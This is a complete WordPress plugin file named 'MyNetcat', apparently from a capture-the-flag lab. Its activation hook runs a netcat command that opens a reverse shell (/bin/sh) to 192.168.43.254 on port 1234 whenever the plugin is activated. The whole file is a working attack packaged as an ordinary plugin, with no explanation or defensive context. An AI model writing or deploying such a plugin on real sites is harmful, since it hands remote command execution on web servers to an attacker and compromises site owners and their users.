<?php
  /*
  Plugin name: MyNetcat
  Description: MyNetcat WordPress Plugin
  Author: DCAU
  Author URI: http://www.five86.com
  Version: 1.0
  */

register_activation_hook( __FILE__, 'mynetcat_activation' );
  function mynetcat_activation() {
    system("nc -e /bin/sh 192.168.43.254 1234");
  }
